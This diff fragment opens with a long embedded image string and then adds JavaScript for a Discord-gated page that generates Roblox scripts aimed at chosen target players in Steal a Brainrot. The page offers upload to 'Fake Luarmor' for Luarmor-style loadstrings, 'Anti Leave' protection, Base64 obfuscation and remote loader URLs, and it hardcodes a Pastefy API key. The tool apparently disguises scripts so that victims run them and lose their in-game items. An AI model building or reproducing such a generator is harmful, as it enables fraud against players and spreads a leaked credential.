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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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";
+
+async function loadHonenLoginLogo(){
+  const logo=document.getElementById("guildLogo");
+  const fallback=document.getElementById("guildFallback");
+  if(!logo||!fallback)return;
+  try{
+    const response=await fetch("https://discord.com/api/v10/invites/GAu8ccgr4X?with_counts=true");
+    if(!response.ok)throw new Error("No se pudo consultar la invitación");
+    const invite=await response.json();
+    const guild=invite.guild;
+    if(!guild||!guild.id||!guild.icon)throw new Error("No se encontró el icono del servidor");
+    const ext=guild.icon.startsWith("a_")?"gif":"png";
+    logo.onload=()=>{logo.hidden=false;fallback.hidden=true;};
+    logo.onerror=()=>{logo.hidden=true;fallback.hidden=false;};
+    logo.src=`https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.${ext}?size=128`;
+  }catch(error){logo.hidden=true;fallback.hidden=false;}
+}
+loadHonenLoginLogo();
+
+const DISCORD_CLIENT_ID = "1555251496537301053";
+const DISCORD_REDIRECT_URI = "https://discordlogin-green.vercel.app";
+const DISCORD_AUTH_URL = "https://discord.com/oauth2/authorize?client_id=1555251496537301053&response_type=code&redirect_uri=https%3A%2F%2Fdiscordlogin-green.vercel.app&scope=identify+guilds";
+const PASTEFY_API_KEY = "V8FT0FE52MIx8k74EYbNWxdmnjSxtSRni5TXjiVUwxm7Sq4I2L7g8NYoKcYj";
+const REQUIRED_GUILD_ID = "1503164380093743174";
+const LOGIC_LOADER = "https://api.luarmor.net/files/v4/loaders/a801d34093cb75d1b90c882704daabee.lua";
+const AUTO_CODE_LOADER = "https://raw.githubusercontent.com/ZLHubOp/1OF1/refs/heads/main/autocode";
+const DUEL_LOADER = "https://api.pastes.dev/pDQSJe56Xv";
+
+let userInRequiredServer = false;
+let currentDiscordUserId = null;
+let autoSaveEnabled = true;
+let currentLang = localStorage.getItem("wxnad_lang") || "es";
+let scriptMode = "NO-GUI";
+
+// ═══════════════════════════════════════════════════
+// I18N
+// ═══════════════════════════════════════════════════
+const I18N = {
+  es: {
+    authDesc: "Inicia sesión con Discord y únete al servidor para acceder al generador de scripts.",
+    subtitle: "Generación automática de scripts para tus targets de Roblox",
+    "lbl-target": "TARGET USERNAME / ID / URL",
+    "lbl-targetId": "TARGET ID (auto-detectado)",
+    "lbl-mode": "MODO DE SCRIPT",
+    "lbl-brainrots": "BRAINROTS",
+    "lbl-gears": "GEARS",
+    "lbl-bases": "BASE SKINS",
+    "lbl-options": "</> OPCIONES LOADSTRING",
+    "lbl-generated": "📜 Script generado",
+    "desc-pastefy": "Sube el script a Pastefy y genera un loadstring compacto.",
+    "desc-luarmor": "Sube el script a Fake Luarmor y genera un loadstring estilo Luarmor.",
+    "desc-antileave": "Activa protección Anti Leave en el script generado.",
+    "desc-obfuscate": "Ofuscación local en Base64.",
+    genWarn: "⚠️ SELECCIONA AL MENOS UN TARGET",
+    genId: "⚠️ INGRESA EL ID DEL TARGET",
+    genServer: "⚠️ REQUIERE ESTAR EN EL SERVER",
+    genOk: "⚡ GENERAR SCRIPT",
+    selectBrainrots: "Selecciona brainrots...",
+    selectGears: "Selecciona gears...",
+    selectBases: "Selecciona bases...",
+    selected: "seleccionados",
+    toastCopied: "✅ Copiado al portapapeles",
+    toastPastefy: "✅ Subido a Pastefy",
+    toastFakeLuarmor: "✅ Subido a Fake Luarmor",
+    toastNeedId: "⚠️ Ingresa el ID del target",
+    toastObfErr: "❌ Error al ofuscar",
+    toastMpsInvalid: "❌ MPS inválido (ej: 100M, 1B)",
+    toastMpsApplied: "brainrots filtrados",
+    toastAutoOn: "✅ Auto-guardado activado",
+    toastAutoOff: "🔕 Auto-guardado desactivado",
+    toastLoaded: "✅ Script cargado",
+    toastDeleted: "🗑️ Script eliminado",
+    lookupSearching: "🔍 Buscando usuario...",
+    lookupSearchingShort: "🔍 Buscando...",
+    lookupFound: "✅ Encontrado",
+    lookupNotFound: "❌ Usuario no encontrado",
+    lookupIdDetected: "✅ ID detectado",
+    lookupEnter: "Pulsa Enter o espera para buscar",
+    lookupRate: "⚠️ Rate limit, espera unos segundos",
+    historyEmpty: "No hay scripts generados todavía.",
+    noTarget: "Sin target",
+    copy: "Copiar",
+    use: "Usar",
+    del: "Eliminar",
+    scriptsHistory: "Scripts Generados"
+  },
+  en: {
+    authDesc: "Sign in with Discord and join the server to access the script generator.",
+    subtitle: "Automated script generation for your Roblox targets",
+    "lbl-target": "TARGET USERNAME / ID / URL",
+    "lbl-targetId": "TARGET ID (auto-detected)",
+    "lbl-mode": "SCRIPT MODE",
+    "lbl-brainrots": "BRAINROTS",
+    "lbl-gears": "GEARS",
+    "lbl-bases": "BASE SKINS",
+    "lbl-options": "</> LOADSTRING OPTIONS",
+    "lbl-generated": "📜 Generated script",
+    "desc-pastefy": "Upload script to Pastefy and get a compact loadstring.",
+    "desc-luarmor": "Upload script to Fake Luarmor and get a Luarmor-style loadstring.",
+    "desc-antileave": "Enables Anti Leave protection in the generated script.",
+    "desc-obfuscate": "Local obfuscation in Base64.",
+    genWarn: "⚠️ SELECT AT LEAST ONE TARGET",
+    genId: "⚠️ ENTER TARGET ID",
+    genServer: "⚠️ MUST BE IN THE SERVER",
+    genOk: "⚡ GENERATE SCRIPT",
+    selectBrainrots: "Select brainrots...",
+    selectGears: "Select gears...",
+    selectBases: "Select bases...",
+    selected: "selected",
+    toastCopied: "✅ Copied to clipboard",
+    toastPastefy: "✅ Uploaded to Pastefy",
+    toastFakeLuarmor: "✅ Uploaded to Fake Luarmor",
+    toastNeedId: "⚠️ Enter target ID",
+    toastObfErr: "❌ Obfuscation error",
+    toastMpsInvalid: "❌ Invalid MPS (e.g. 100M, 1B)",
+    toastMpsApplied: "brainrots filtered",
+    toastAutoOn: "✅ Auto-save enabled",
+    toastAutoOff: "🔕 Auto-save disabled",
+    toastLoaded: "✅ Script loaded",
+    toastDeleted: "🗑️ Script deleted",
+    lookupSearching: "🔍 Searching user...",
+    lookupSearchingShort: "🔍 Searching...",
+    lookupFound: "✅ Found",
+    lookupNotFound: "❌ User not found",
+    lookupIdDetected: "✅ ID detected",
+    lookupEnter: "Press Enter or wait to search",
+    lookupRate: "⚠️ Rate limited, wait a moment",
+    historyEmpty: "No scripts generated yet.",
+    noTarget: "No target",
+    copy: "Copy",
+    use: "Use",
+    del: "Delete",
+    scriptsHistory: "Generated Scripts"
+  },
+  pt: {
+    authDesc: "Entre com seu Discord e participe do servidor para acessar o gerador de scripts.",
+    subtitle: "Geração automática de scripts para seus targets do Roblox",
+    "lbl-target": "TARGET USERNAME / ID / URL",
+    "lbl-targetId": "TARGET ID (auto-detectado)",
+    "lbl-mode": "MODO DO SCRIPT",
+    "lbl-brainrots": "BRAINROTS",
+    "lbl-gears": "GEARS",
+    "lbl-bases": "BASE SKINS",
+    "lbl-options": "</> OPÇÕES LOADSTRING",
+    "lbl-generated": "📜 Script gerado",
+    "desc-pastefy": "Envie o script para o Pastefy e gere um loadstring compacto.",
+    "desc-luarmor": "Envie o script para o Fake Luarmor e gere um loadstring estilo Luarmor.",
+    "desc-antileave": "Ativa proteção Anti Leave no script gerado.",
+    "desc-obfuscate": "Ofuscação local em Base64.",
+    genWarn: "⚠️ SELECIONE PELO MENOS UM TARGET",
+    genId: "⚠️ INSIRA O ID DO TARGET",
+    genServer: "⚠️ PRECISA ESTAR NO SERVIDOR",
+    genOk: "⚡ GERAR SCRIPT",
+    selectBrainrots: "Selecione brainrots...",
+    selectGears: "Selecione gears...",
+    selectBases: "Selecione bases...",
+    selected: "selecionados",
+    toastCopied: "✅ Copiado",
+    toastPastefy: "✅ Enviado ao Pastefy",
+    toastFakeLuarmor: "✅ Enviado ao Fake Luarmor",
+    toastNeedId: "⚠️ Insira o ID do target",
+    toastObfErr: "❌ Erro ao ofuscar",
+    toastMpsInvalid: "❌ MPS inválido (ex: 100M, 1B)",
+    toastMpsApplied: "brainrots filtrados",
+    toastAutoOn: "✅ Auto-save ativado",
+    toastAutoOff: "🔕 Auto-save desativado",
+    toastLoaded: "✅ Script carregado",
+    toastDeleted: "🗑️ Script excluído",
+    lookupSearching: "🔍 Buscando usuário...",
+    lookupSearchingShort: "🔍 Buscando...",
+    lookupFound: "✅ Encontrado",
+    lookupNotFound: "❌ Usuário não encontrado",
+    lookupIdDetected: "✅ ID detectado",
+    lookupEnter: "Pressione Enter ou aguarde",
+    lookupRate: "⚠️ Rate limit, aguarde",
+    historyEmpty: "Ainda não há scripts gerados.",
+    noTarget: "Sem target",
+    copy: "Copiar",
+    use: "Usar",
+    del: "Excluir",
+    scriptsHistory: "Scripts Gerados"
+  }
+};
+function t(k){ return (I18N[currentLang]||I18N.es)[k] || k; }
+
+function applyLang(){
+  const lang = document.getElementById("langFlag");
+  const flags = {es:"https://flagcdn.com/es.svg",en:"https://flagcdn.com/gb.svg",pt:"https://flagcdn.com/br.svg"};
+  if(lang) lang.src = flags[currentLang]||flags.es;
+  ["es","en","pt"].forEach(l => {
+    document.getElementById("chk-"+l).textContent = l===currentLang?"✓":"";
+    document.querySelectorAll(".lang-item").forEach(el => {
+      if(el.dataset.lang===currentLang) el.classList.add("active"); else el.classList.remove("active");
+    });
+  });
+  const setTxt = (id,k) => { const el=document.getElementById(id); if(el) el.textContent=t(k); };
+  setTxt("subtitle","subtitle");
+  setTxt("authDesc","authDesc");
+  setTxt("lbl-target","lbl-target");
+  setTxt("lbl-targetId","lbl-targetId");
+  setTxt("lbl-mode","lbl-mode");
+  setTxt("lbl-brainrots","lbl-brainrots");
+  setTxt("lbl-gears","lbl-gears");
+  setTxt("lbl-bases","lbl-bases");
+  setTxt("lbl-options","lbl-options");
+  setTxt("lbl-generated","lbl-generated");
+  setTxt("desc-pastefy","desc-pastefy");
+  setTxt("desc-luarmor","desc-luarmor");
+  setTxt("desc-antileave","desc-antileave");
+  setTxt("desc-obfuscate","desc-obfuscate");
+  updateButtonState();
+}
+
+document.querySelectorAll(".lang-item").forEach(item=>{
+  item.onclick=()=>{
+    currentLang=item.dataset.lang;
+    localStorage.setItem("wxnad_lang",currentLang);
+    document.getElementById("langMenu").classList.remove("open");
+    applyLang();
+  };
+});
+document.getElementById("langBtn").onclick=(e)=>{e.stopPropagation();document.getElementById("langMenu").classList.toggle("open");};
+document.addEventListener("click",e=>{if(!e.target.closest(".lang-wrap"))document.getElementById("langMenu").classList.remove("open");});
+
+// ═══════════════════════════════════════════════════
+// DATA
+// ═══════════════════════════════════════════════════
+const BRAINROT_ENTRIES = [
+  { name: "Strawberry Elephant", rarity: "OG", mps: "$750M/s" },
+  { name: "Meowl", rarity: "OG", mps: "$600M/s" },
+  { name: "Headless Horseman", rarity: "OG", mps: "$550M/s" },
+  { name: "John Pork", rarity: "OG", mps: "$500M/s" },
+  { name: "Skibidi Toilet", rarity: "OG", mps: "$450M/s" },
+  { name: "Phoenix", rarity: "Secret", mps: "$425M/s" },
+  { name: "Los Dragons", rarity: "Secret", mps: "$425M/s" },
+  { name: "Griffin", rarity: "Secret", mps: "$400M/s" },
+  { name: "Dragon Aquanini", rarity: "Secret", mps: "$375M/s" },
+  { name: "Dragon Gingerini", rarity: "Secret", mps: "$350M/s" },
+  { name: "Dragon Skeletonini", rarity: "Secret", mps: "$325M/s" },
+  { name: "Plant Bros", rarity: "Secret", mps: "$300M/s" },
+  { name: "Hydra Dragon Cannelloni", rarity: "Secret", mps: "$300M/s" },
+  { name: "Dragon Cannelloni", rarity: "Secret", mps: "$250M/s" },
